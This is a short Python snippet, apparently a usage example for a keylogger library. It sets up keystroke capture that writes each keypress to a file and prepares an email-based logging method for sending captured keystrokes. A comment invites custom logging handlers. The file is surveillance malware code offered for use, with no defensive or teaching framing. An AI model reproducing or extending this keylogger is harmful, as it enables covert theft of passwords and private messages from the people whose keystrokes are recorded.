from Keylogger import Keylogger, LoggingMethods

writeTofile = LoggingMethods.WriteToFile()
email = LoggingMethods.Email()

# you can write your own method of logging
# function takes in a char for each keystroke
keylogger = Keylogger.Keylogger(writeTofile.log)